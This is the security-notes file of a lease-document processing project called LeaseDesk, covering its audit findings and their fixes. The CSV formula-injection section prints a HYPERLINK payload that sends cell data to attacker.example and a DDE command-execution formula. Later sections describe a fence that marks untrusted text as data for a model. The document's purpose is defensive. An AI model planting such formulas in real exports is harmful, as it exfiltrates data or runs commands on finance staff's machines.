# Security notes

What this system reads, what it writes, and what we did about the gap.

The premise that drives all of it: **every document LeaseDesk reads was written
by someone outside the company**, and several of the things it writes are
opened by a finance team in a spreadsheet. A landlord does not need to
compromise anything to attack us — they only need to send an invoice.

## Findings from the audit, and their status

| | Finding | Severity | Status |
|---|---|---|---|
| 1 | CSV formula injection in the AP and bank exports | **High** | Fixed |
| 2 | An unreadable document parsed as an empty statement | **Medium** | Fixed |
| 3 | A malformed workbook crashed ingestion with a raw traceback | Low | Fixed |
| 4 | A source name could write apparent markup into the fence header | Low | Fixed |
| 5 | No size limit on an ingested document | Medium | Fixed |

### 1. CSV formula injection — CWE-1236

`write_ap_export` and `write_bank_export` wrote landlord-supplied text —
line-item descriptions, counterparty names — straight into CSV. A cell
beginning `=`, `+`, `-` or `@` is a formula, not text, in Excel, Sheets,
LibreOffice and Numbers. So a landlord could put

```
=HYPERLINK("http://attacker.example/"&A1,"Click for invoice")
```

in a description, and the AP clerk opening the export sees a plausible link
that exfiltrates the cell beside it. On older Excel with DDE enabled,
`=cmd|' /C calc'!A0` reaches command execution. No software bug is required.

Fixed in `backend/app/docs/safe_csv.py`, applied at the point of writing rather
than in each caller. Numbers pass through untouched, because quoting them would
turn every amount into text.

**One wrong turn worth recording.** The first guard was a leading tab, chosen
because it is invisible. A leading tab is one of the characters that is
stripped *before* formula parsing, so the guard left the cell exactly as
dangerous as it found it — and the test asserting `is_dangerous(neutralize(x))`
is false caught it. The guard is now the standard apostrophe. That does change
the bytes, which is unavoidable; `denormalize()` is the inverse so a round trip
through our own exports is lossless.

### 2. An unreadable document became an empty statement

`parse()` fell through to the CSV parser for any non-PDF bytes. A corrupt PDF,
a stray HTML page or binary rubbish came back as a portal export with zero line
items and no total — **which reads exactly like a statement that charges
nothing, and a statement that charges nothing is approved.**

It now raises `UnreadableDocument`, naming what the bytes look like. Refusing
loudly is the correct behaviour: a parse that silently drops what it could not
read is worse than one that fails.

### 3, 5. Malformed and oversized input

A workbook from a shared drive may be anything. `read_tracker` now raises
`UnreadableWorkbook` rather than letting a `BadZipFile` or `KeyError` surface
half way through ingestion, and `parse()` refuses anything over 16 MB before
reading it.

### 4. The untrusted fence

The fence itself held under every breakout attempt — closing tags, case
variants, nested opens. The weakness was the `source` attribute, which comes
from a filename or mail header and is therefore attacker-chosen: swapping
double quotes for single ones stopped it closing the attribute but still let it
write `nonce='...'` into the header, where a model might read it as structure.
Only safe characters survive now.

## What was already right

- **Content-addressed storage** validates every key as a hex digest, so a key
  cannot escape the store root. Eight traversal forms are tested.
- **The fence carries attacks through rather than stripping them.** Removing
  the text would hide the attempt from the audit trail; the model is told
  plainly that the block is data.
- **No `eval`, `exec`, `pickle`, `os.system` or `shell=True`** anywhere.
- **No secrets** in the tree or in git history.
- **Regex patterns are linear** on hostile input — the parser's patterns were
  timed against a 4 KB adversarial string.
- **The answer key and the held-out company are unreachable** from
  `backend/app`, `leasedesk` and the rest of `datagen`, enforced by tests.

## Still open

- **Nothing is authenticated.** There is no API and no session handling yet;
  `can()` and the database roles are chunks A5–A6 and unbuilt. Every claim
  about permissions in this repo is a claim about code that does not exist yet.
- **Scanned documents go to vision unvalidated.** A page image is passed
  through without checking its dimensions or decompressed size.
- **No rate or cost ceiling on model calls.** The response cache bounds repeat
  work, not a first run over a large corpus.

## Running the checks

```bash
./.venv/bin/python -m pytest backend/tests/test_security.py
```

Each test there is a vulnerability that was present and is now closed.
